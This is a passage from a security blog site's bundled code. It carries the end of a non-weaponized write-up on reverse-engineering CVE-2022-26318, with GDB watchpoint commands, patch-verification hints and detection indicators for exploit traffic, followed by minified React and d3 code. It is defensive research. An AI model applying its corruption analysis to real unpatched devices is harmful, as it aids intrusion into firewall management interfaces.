    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,vv={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:cv},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:hv},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:mv},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:gv},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:fv},1001:{title:"CVE-2024–1001",slug:"1001",content:rv},"0012":{title:"CVE-2024–0012",slug:"0012",content:tv},40982:{title:"CVE-2022–40982",slug:"40982",content:lv},cow:{title:"CVE-2016–5195",slug:"cow",content:ov},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:dv},23397:{title:"CVE-2023–23397",slug:"23397",content:av},"0160":{title:"CVE-2014-0160",slug:"0160",content:sv},11882:{title:"CVE-2017-11882",slug:"11882",content:iv},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:pv},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:uv}};function yv(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const i=[".blog-text","article",".blog-post-content","main"];let a=t.body;for(const l of i){const o=t.querySelector(l);if(o){a=o;break}}return a.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((l,o)=>{l.id||(l.id=`section-${o+1}`)}),a.innerHTML||e}catch{return e}}function wv(){const{slug:e}=lg(),n=vv[e],t=Qa.find(i=>i.slug===e),s=b.useMemo(()=>n?yv(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return b.useEffect(()=>{const i=document.querySelector(".giscus-container");if(!i)return;i.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",r()),i.appendChild(a),()=>{i.innerHTML=""}},[e]),b.useEffect(()=>{const i=()=>{var o;const l=document.querySelector("iframe.giscus-frame");l&&((o=l.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},a=new MutationObserver(i);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),i(),()=>a.disconnect()},[]),n?u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-post-header",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{className:"blog-post-title",children:n.title}),t&&u.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),u.jsxs("main",{className:"blog-post-content container",children:[u.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),u.jsx("section",{className:"comments",children:u.jsx("div",{className:"container",children:u.jsx("div",{className:"giscus-container"})})})]})]}):u.jsxs("main",{className:"blog-post-content container",children:[u.jsx("h2",{children:"Post not found"}),u.jsx("p",{children:"Signal lost. Let’s go back."}),u.jsx(Ie,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}const kv=["All","Security Tools","Research","Web","Desktop","Cloud","Automation"];function bv({activeFilter:e,onFilterChange:n}){return u.jsx("div",{className:"filter-chips",children:kv.map(t=>u.jsx("button",{className:`chip ${t===e?"active":""}`,type:"button",onClick:()=>n(t),children:t},t))})}function xv({items:e}){const[n,t]=b.useState(0);if(!(e!=null&&e.length))return null;const s=e[n],r=()=>t(a=>(a+1)%e.length),i=()=>t(a=>(a-1+e.length)%e.length);return u.jsxs("div",{className:"featured-carousel",children:[u.jsxs("div",{className:"featured-card",children:[u.jsxs("div",{className:"featured-meta",children:[u.jsx("span",{className:"pill",children:"Featured"}),s.tag&&u.jsx("span",{className:"pill",children:s.tag})]}),u.jsx("h3",{children:s.title}),u.jsx("p",{children:s.description}),u.jsx("div",{className:"project-tags",children:(s.tags||[]).map(a=>u.jsx("span",{className:"pill",children:a},a))}),u.jsx("div",{className:"featured-actions",children:u.jsx("a",{href:s.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),e.length>1&&u.jsxs("div",{className:"featured-controls",children:[u.jsx("button",{type:"button",onClick:i,className:"button ghost",children:"←"}),u.jsx("button",{type:"button",onClick:r,className:"button ghost",children:"→"})]})]})}function Sv({items:e,showViewAll:n=!1,showHeader:t=!0}){const[s,r]=b.useState("All"),[i,a]=b.useState(1),l=4,o=e.slice(0,2),c=b.useMemo(()=>s==="All"?e:e.filter(v=>{var y;return(y=v.tags)==null?void 0:y.some(w=>w.toLowerCase().includes(s.toLowerCase().split(" ")[0]))}),[s,e]),p=Math.max(1,Math.ceil(c.length/l)),d=c.slice((i-1)*l,i*l),h=v=>{r(v),a(1)};return u.jsx("section",{className:"projects",id:"projects",children:u.jsxs("div",{className:"container",children:[t&&u.jsxs("div",{className:"section-header",children:[u.jsxs("div",{children:[u.jsx("h2",{className:"section-title",children:"Projects"}),u.jsx("p",{className:"section-subtitle",children:"Deployment dossier — hardened builds and offensive prototypes."})]}),n&&u.jsx("div",{className:"section-actions",children:u.jsx(Ie,{className:"link-button",to:"/projects",children:"View all projects"})})]}),t&&u.jsx(bv,{activeFilter:s,onFilterChange:h}),t&&u.jsx(xv,{items:o}),u.jsx("div",{className:"projects-list",children:d.map(v=>{var y;return u.jsxs("div",{className:"project-row",children:[u.jsxs("div",{className:"project-row-body",children:[u.jsx("a",{href:v.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:u.jsx("h5",{className:"project-title",children:v.title})}),u.jsx("p",{className:"project-description",children:v.description}),(y=v.tags)!=null&&y.length?u.jsx("div",{className:"project-tags",children:v.tags.map(w=>u.jsx("span",{className:"pill",children:w},w))}):null]}),u.jsx("div",{className:"project-row-cta",children:u.jsx("a",{href:v.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},v.title)})}),p>1&&u.jsxs("div",{className:"blog-pagination project-pagination",children:[u.jsx("button",{className:"pill",disabled:i===1,onClick:()=>a(Math.max(1,i-1)),children:"Previous"}),u.jsxs("span",{className:"blog-page-indicator",children:["Page ",i," of ",p]}),u.jsx("button",{className:"pill",disabled:i===p,onClick:()=>a(Math.min(p,i+1)),children:"Next"})]})]})})}function _v(){return u.jsx("div",{className:"hud-workspace",children:u.jsxs(Wn,{title:"Projects // Deployables",subtitle:"drag / resize",initialSize:{width:1180},children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"Projects"}),u.jsx("p",{className:"blog-subtitle",children:"Deployments, exploit prototypes, and research drops."})]})}),u.jsx(Sv,{items:Xg,showHeader:!1})]})})}function Ev({issuer:e="Cert"}){var t;const n=((t=e==null?void 0:e[0])==null?void 0:t.toUpperCase())||"C";return u.jsx("div",{className:"cert-badge",children:n})}const Tv=["All","Security","Cloud","Networking"];function Cv({items:e,showViewAll:n=!1,showHeader:t=!0}){const[s,r]=b.useState("All"),[i,a]=b.useState(1),l=5,o=b.useMemo(()=>s==="All"?e:e.filter(h=>h.domain?h.domain===s:!0),[s,e]),c=Math.max(1,Math.ceil(o.length/l)),p=o.slice((i-1)*l,i*l),d=h=>{r(h),a(1)};return u.jsx("section",{className:"certifications",id:"certs",children:u.jsxs("div",{className:"container",children:[t&&u.jsxs("div",{className:"section-header",children:[u.jsx("div",{children:u.jsx("h2",{children:"CERTIFICATIONS"})}),n&&u.jsx("div",{className:"section-actions",children:u.jsx(Ie,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),t&&u.jsx("div",{className:"filter-chips",children:Tv.map(h=>u.jsx("button",{className:`chip ${h===s?"active":""}`,type:"button",onClick:()=>d(h),children:h},h))}),u.jsx("div",{className:"cert-list",children:p.map(h=>u.jsxs("div",{className:"cert-row",children:[u.jsxs("div",{className:"cert-row-meta",children:[u.jsx("div",{className:"cert-row-badge",children:u.jsx(Ev,{issuer:h.issuer})}),u.jsxs("div",{className:"cert-row-tags",children:[u.jsx("span",{className:"pill",children:h.domain}),u.jsx("span",{className:"pill",children:h.issuer})]})]}),u.jsxs("div",{className:"cert-row-body",children:[u.jsx("div",{className:"cert-row-title",children:h.title}),u.jsx("p",{className:"cert-row-details",children:h.details})]}),u.jsx("div",{className:"cert-row-cta",children:u.jsx("a",{href:h.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},h.title))}),c>1&&u.jsxs("div",{className:"blog-pagination project-pagination",children:[u.jsx("button",{className:"pill",disabled:i===1,onClick:()=>a(Math.max(1,i-1)),children:"Previous"}),u.jsxs("span",{className:"blog-page-indicator",children:["Page ",i," of ",c]}),u.jsx("button",{className:"pill",disabled:i===c,onClick:()=>a(Math.min(c,i+1)),children:"Next"})]})]})})}function Nv(){return u.jsx("div",{className:"hud-workspace",children:u.jsxs(Wn,{title:"Credentials",subtitle:"drag / resize",initialSize:{width:1180},children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"Certifications"}),u.jsx("p",{className:"blog-subtitle",children:"Credentials earned; operators verified."})]})}),u.jsx(Cv,{items:Kg,showHeader:!1})]})})}var Av={value:()=>{}};function Cd(){for(var e=0,n=arguments.length,t={},s;e<n;++e){if(!(s=arguments[e]+"")||s in t||/[\s.]/.test(s))throw new Error("illegal type: "+s);t[s]=[]}return new kr(t)}function kr(e){this._=e}function Pv(e,n){return e.trim().split(/^|\s+/).map(function(t){var s="",r=t.indexOf(".");if(r>=0&&(s=t.slice(r+1),t=t.slice(0,r)),t&&!n.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:s}})}kr.prototype=Cd.prototype={constructor:kr,on:function(e,n){var t=this._,s=Pv(e+"",t),r,i=-1,a=s.length;if(arguments.length<2){for(;++i<a;)if((r=(e=s[i]).type)&&(r=Lv(t[r],e.name)))return r;return}if(n!=null&&typeof n!="function")throw new Error("invalid callback: "+n);for(;++i<a;)if(r=(e=s[i]).type)t[r]=Pc(t[r],e.name,n);else if(n==null)for(r in t)t[r]=Pc(t[r],e.name,null);return this},copy:function(){var e={},n=this._;for(var t in n)e[t]=n[t].slice();return new kr(e)},call:function(e,n){if((r=arguments.length-2)>0)for(var t=new Array(r),s=0,r,i;s<r;++s)t[s]=arguments[s+2];if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(i=this._[e],s=0,r=i.length;s<r;++s)i[s].value.apply(n,t)},apply:function(e,n,t){if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(var s=this._[e],r=0,i=s.length;r<i;++r)s[r].value.apply(n,t)}};function Lv(e,n){for(var t=0,s=e.length,r;t<s;++t)if((r=e[t]).name===n)return r.value}function Pc(e,n,t){for(var s=0,r=e.length;s<r;++s)if(e[s].name===n){e[s]=Av,e=e.slice(0,s).concat(e.slice(s+1));break}return t!=null&&e.push({name:n,value:t}),e}var Za="http://www.w3.org/1999/xhtml";const Lc={svg:"http://www.w3.org/2000/svg",xhtml:Za,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function wi(e){var n=e+="",t=n.indexOf(":");return t>=0&&(n=e.slice(0,t))!=="xmlns"&&(e=e.slice(t+1)),Lc.hasOwnProperty(n)?{space:Lc[n],local:e}:e}function Rv(e){return function(){var n=this.ownerDocument,t=this.namespaceURI;return t===Za&&n.documentElement.namespaceURI===Za?n.createElement(e):n.createElementNS(t,e)}}function Ov(e){return function(){return this.ownerDocument.createElementNS(e.space,e.local)}}function Nd(e){var n=wi(e);return(n.local?Ov:Rv)(n)}function jv(){}function to(e){return e==null?jv:function(){return this.querySelector(e)}}function Iv(e){typeof e!="function"&&(e=to(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=new Array(a),o,c,p=0;p<a;++p)(o=i[p])&&(c=e.call(o,o.__data__,p,i))&&("__data__"in o&&(c.__data__=o.__data__),l[p]=c);return new Fe(s,this._parents)}function Mv(e){return e==null?[]:Array.isArray(e)?e:Array.from(e)}function Dv(){return[]}function Ad(e){return e==null?Dv:function(){return this.querySelectorAll(e)}}function zv(e){return function(){return Mv(e.apply(this,arguments))}}function Fv(e){typeof e=="function"?e=zv(e):e=Ad(e);for(var n=this._groups,t=n.length,s=[],r=[],i=0;i<t;++i)for(var a=n[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&(s.push(e.call(o,o.__data__,c,a)),r.push(o));return new Fe(s,r)}function Pd(e){return function(){return this.matches(e)}}function Ld(e){return function(n){return n.matches(e)}}var Bv=Array.prototype.find;function Uv(e){return function(){return Bv.call(this.children,e)}}function Hv(){return this.firstElementChild}function Vv(e){return this.select(e==null?Hv:Uv(typeof e=="function"?e:Ld(e)))}var Wv=Array.prototype.filter;function $v(){return Array.from(this.children)}function Gv(e){return function(){return Wv.call(this.children,e)}}function Yv(e){return this.selectAll(e==null?$v:Gv(typeof e=="function"?e:Ld(e)))}function qv(e){typeof e!="function"&&(e=Pd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new Fe(s,this._parents)}function Rd(e){return new Array(e.length)}function Xv(){return new Fe(this._enter||this._groups.map(Rd),this._parents)}function qr(e,n){this.ownerDocument=e.ownerDocument,this.namespaceURI=e.namespaceURI,this._next=null,this._parent=e,this.__data__=n}qr.prototype={constructor:qr,appendChild:function(e){return this._parent.insertBefore(e,this._next)},insertBefore:function(e,n){return this._parent.insertBefore(e,n)},querySelector:function(e){return this._parent.querySelector(e)},querySelectorAll:function(e){return this._parent.querySelectorAll(e)}};function Kv(e){return function(){return e}}function Qv(e,n,t,s,r,i){for(var a=0,l,o=n.length,c=i.length;a<c;++a)(l=n[a])?(l.__data__=i[a],s[a]=l):t[a]=new qr(e,i[a]);for(;a<o;++a)(l=n[a])&&(r[a]=l)}function Zv(e,n,t,s,r,i,a){var l,o,c=new Map,p=n.length,d=i.length,h=new Array(p),v;for(l=0;l<p;++l)(o=n[l])&&(h[l]=v=a.call(o,o.__data__,l,n)+"",c.has(v)?r[l]=o:c.set(v,o));for(l=0;l<d;++l)v=a.call(e,i[l],l,i)+"",(o=c.get(v))?(s[l]=o,o.__data__=i[l],c.delete(v)):t[l]=new qr(e,i[l]);for(l=0;l<p;++l)(o=n[l])&&c.get(h[l])===o&&(r[l]=o)}function Jv(e){return e.__data__}function ey(e,n){if(!arguments.length)return Array.from(this,Jv);var t=n?Zv:Qv,s=this._parents,r=this._groups;typeof e!="function"&&(e=Kv(e));for(var i=r.length,a=new Array(i),l=new Array(i),o=new Array(i),c=0;c<i;++c){var p=s[c],d=r[c],h=d.length,v=ny(e.call(p,p&&p.__data__,c,s)),y=v.length,w=l[c]=new Array(y),x=a[c]=new Array(y),m=o[c]=new Array(h);t(p,d,w,x,m,v,n);for(var f=0,g=0,k,_;f<y;++f)if(k=w[f]){for(f>=g&&(g=f+1);!(_=x[g])&&++g<y;);k._next=_||null}}return a=new Fe(a,s),a._enter=l,a._exit=o,a}function ny(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function ty(){return new Fe(this._exit||this._groups.map(Rd),this._parents)}function sy(e,n,t){var s=this.enter(),r=this,i=this.exit();return typeof e=="function"?(s=e(s),s&&(s=s.selection())):s=s.append(e+""),n!=null&&(r=n(r),r&&(r=r.selection())),t==null?i.remove():t(i),s&&r?s.merge(r).order():r}function ry(e){for(var n=e.selection?e.selection():e,t=this._groups,s=n._groups,r=t.length,i=s.length,a=Math.min(r,i),l=new Array(r),o=0;o<a;++o)for(var c=t[o],p=s[o],d=c.length,h=l[o]=new Array(d),v,y=0;y<d;++y)(v=c[y]||p[y])&&(h[y]=v);for(;o<r;++o)l[o]=t[o];return new Fe(l,this._parents)}function iy(){for(var e=this._groups,n=-1,t=e.length;++n<t;)for(var s=e[n],r=s.length-1,i=s[r],a;--r>=0;)(a=s[r])&&(i&&a.compareDocumentPosition(i)^4&&i.parentNode.insertBefore(a,i),i=a);return this}function ay(e){e||(e=ly);function n(d,h){return d&&h?e(d.__data__,h.__data__):!d-!h}for(var t=this._groups,s=t.length,r=new Array(s),i=0;i<s;++i){for(var a=t[i],l=a.length,o=r[i]=new Array(l),c,p=0;p<l;++p)(c=a[p])&&(o[p]=c);o.sort(n)}return new Fe(r,this._parents).order()}function ly(e,n){return e<n?-1:e>n?1:e>=n?0:NaN}function oy(){var e=arguments[0];return arguments[0]=this,e.apply(null,arguments),this}function cy(){return Array.from(this)}function uy(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length;r<i;++r){var a=s[r];if(a)return a}return null}function py(){let e=0;for(const n of this)++e;return e}function dy(){return!this.node()}function hy(e){for(var n=this._groups,t=0,s=n.length;t<s;++t)for(var r=n[t],i=0,a=r.length,l;i<a;++i)(l=r[i])&&e.call(l,l.__data__,i,r);return this}function fy(e){return function(){this.removeAttribute(e)}}function my(e){return function(){this.removeAttributeNS(e.space,e.local)}}function gy(e,n){return function(){this.setAttribute(e,n)}}function vy(e,n){return function(){this.setAttributeNS(e.space,e.local,n)}}function yy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttribute(e):this.setAttribute(e,t)}}function wy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttributeNS(e.space,e.local):this.setAttributeNS(e.space,e.local,t)}}function ky(e,n){var t=wi(e);if(arguments.length<2){var s=this.node();return t.local?s.getAttributeNS(t.space,t.local):s.getAttribute(t)}return this.each((n==null?t.local?my:fy:typeof n=="function"?t.local?wy:yy:t.local?vy:gy)(t,n))}function Od(e){return e.ownerDocument&&e.ownerDocument.defaultView||e.document&&e||e.defaultView}function by(e){return function(){this.style.removeProperty(e)}}function xy(e,n,t){return function(){this.style.setProperty(e,n,t)}}function Sy(e,n,t){return function(){var s=n.apply(this,arguments);s==null?this.style.removeProperty(e):this.style.setProperty(e,s,t)}}function _y(e,n,t){return arguments.length>1?this.each((n==null?by:typeof n=="function"?Sy:xy)(e,n,t??"")):Nt(this.node(),e)}function Nt(e,n){return e.style.getPropertyValue(n)||Od(e).getComputedStyle(e,null).getPropertyValue(n)}function Ey(e){return function(){delete this[e]}}function Ty(e,n){return function(){this[e]=n}}function Cy(e,n){return function(){var t=n.apply(this,arguments);t==null?delete this[e]:this[e]=t}}function Ny(e,n){return arguments.length>1?this.each((n==null?Ey:typeof n=="function"?Cy:Ty)(e,n)):this.node()[e]}function jd(e){return e.trim().split(/^|\s+/)}function so(e){return e.classList||new Id(e)}function Id(e){this._node=e,this._names=jd(e.getAttribute("class")||"")}Id.prototype={add:function(e){var n=this._names.indexOf(e);n<0&&(this._names.push(e),this._node.setAttribute("class",this._names.join(" ")))},remove:function(e){var n=this._names.indexOf(e);n>=0&&(this._names.splice(n,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(e){return this._names.indexOf(e)>=0}};function Md(e,n){for(var t=so(e),s=-1,r=n.length;++s<r;)t.add(n[s])}function Dd(e,n){for(var t=so(e),s=-1,r=n.length;++s<r;)t.remove(n[s])}function Ay(e){return function(){Md(this,e)}}function Py(e){return function(){Dd(this,e)}}function Ly(e,n){return function(){(n.apply(this,arguments)?Md:Dd)(this,e)}}function Ry(e,n){var t=jd(e+"");if(arguments.length<2){for(var s=so(this.node()),r=-1,i=t.length;++r<i;)if(!s.contains(t[r]))return!1;return!0}return this.each((typeof n=="function"?Ly:n?Ay:Py)(t,n))}function Oy(){this.textContent=""}function jy(e){return function(){this.textContent=e}}function Iy(e){return function(){var n=e.apply(this,arguments);this.textContent=n??""}}function My(e){return arguments.length?this.each(e==null?Oy:(typeof e=="function"?Iy:jy)(e)):this.node().textContent}function Dy(){this.innerHTML=""}function zy(e){return function(){this.innerHTML=e}}function Fy(e){return function(){var n=e.apply(this,arguments);this.innerHTML=n??""}}function By(e){return arguments.length?this.each(e==null?Dy:(typeof e=="function"?Fy:zy)(e)):this.node().innerHTML}function Uy(){this.nextSibling&&this.parentNode.appendChild(this)}function Hy(){return this.each(Uy)}function Vy(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function Wy(){return this.each(Vy)}function $y(e){var n=typeof e=="function"?e:Nd(e);return this.select(function(){return this.appendChild(n.apply(this,arguments))})}function Gy(){return null}function Yy(e,n){var t=typeof e=="function"?e:Nd(e),s=n==null?Gy:typeof n=="function"?n:to(n);return this.select(function(){return this.insertBefore(t.apply(this,arguments),s.apply(this,arguments)||null)})}function qy(){var e=this.parentNode;e&&e.removeChild(this)}function Xy(){return this.each(qy)}function Ky(){var e=this.cloneNode(!1),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Qy(){var e=this.cloneNode(!0),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Zy(e){return this.select(e?Qy:Ky)}function Jy(e){return arguments.length?this.property("__data__",e):this.node().__data__}function e0(e){return function(n){e.call(this,n,this.__data__)}}function n0(e){return e.trim().split(/^|\s+/).map(function(n){var t="",s=n.indexOf(".");return s>=0&&(t=n.slice(s+1),n=n.slice(0,s)),{type:n,name:t}})}function t0(e){return function(){var n=this.__on;if(n){for(var t=0,s=-1,r=n.length,i;t<r;++t)i=n[t],(!e.type||i.type===e.type)&&i.name===e.name?this.removeEventListener(i.type,i.listener,i.options):n[++s]=i;++s?n.length=s:delete this.__on}}}function s0(e,n,t){return function(){var s=this.__on,r,i=e0(n);if(s){for(var a=0,l=s.length;a<l;++a)if((r=s[a]).type===e.type&&r.name===e.name){this.removeEventListener(r.type,r.listener,r.options),this.addEventListener(r.type,r.listener=i,r.options=t),r.value=n;return}}this.addEventListener(e.type,i,t),r={type:e.type,name:e.name,value:n,listener:i,options:t},s?s.push(r):this.__on=[r]}}function r0(e,n,t){var s=n0(e+""),r,i=s.length,a;if(arguments.length<2){var l=this.node().__on;if(l){for(var o=0,c=l.length,p;o<c;++o)for(r=0,p=l[o];r<i;++r)if((a=s[r]).type===p.type&&a.name===p.name)return p.value}return}for(l=n?s0:t0,r=0;r<i;++r)this.each(l(s[r],n,t));return this}function zd(e,n,t){var s=Od(e),r=s.CustomEvent;typeof r=="function"?r=new r(n,t):(r=s.document.createEvent("Event"),t?(r.initEvent(n,t.bubbles,t.cancelable),r.detail=t.detail):r.initEvent(n,!1,!1)),e.dispatchEvent(r)}function i0(e,n){return function(){return zd(this,e,n)}}function a0(e,n){return function(){return zd(this,e,n.apply(this,arguments))}}function l0(e,n){return this.each((typeof n=="function"?a0:i0)(e,n))}function*o0(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length,a;r<i;++r)(a=s[r])&&(yield a)}var c0=[null];function Fe(e,n){this._groups=e,this._parents=n}function Ms(){return new Fe([[document.documentElement]],c0)}function u0(){return this}Fe.prototype=Ms.prototype={constructor:Fe,select:Iv,selectAll:Fv,selectChild:Vv,selectChildren:Yv,filter:qv,data:ey,enter:Xv,exit:ty,join:sy,merge:ry,selection:u0,order:iy,sort:ay,call:oy,nodes:cy,node:uy,size:py,empty:dy,each:hy,attr:ky,style:_y,property:Ny,classed:Ry,text:My,html:By,raise:Hy,lower:Wy,append:$y,insert:Yy,remove:Xy,clone:Zy,datum:Jy,on:r0,dispatch:l0,[Symbol.iterator]:o0};function ro(e,n,t){e.prototype=n.prototype=t,t.constructor=e}function Fd(e,n){var t=Object.create(e.prototype);for(var s in n)t[s]=n[s];return t}function Ds(){}var Es=.7,Xr=1/Es,kt="\\s*([+-]?\\d+)\\s*",Ts="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)\\s*",Ge="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)%\\s*",p0=/^#([0-9a-f]{3,8})$/,d0=new RegExp(`^rgb\\(${kt},${kt},${kt}\\)$`),h0=new RegExp(`^rgb\\(${Ge},${Ge},${Ge}\\)$`),f0=new RegExp(`^rgba\\(${kt},${kt},${kt},${Ts}\\)$`),m0=new RegExp(`^rgba\\(${Ge},${Ge},${Ge},${Ts}\\)$`),g0=new RegExp(`^hsl\\(${Ts},${Ge},${Ge}\\)$`),v0=new RegExp(`^hsla\\(${Ts},${Ge},${Ge},${Ts}\\)$`),Rc={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslat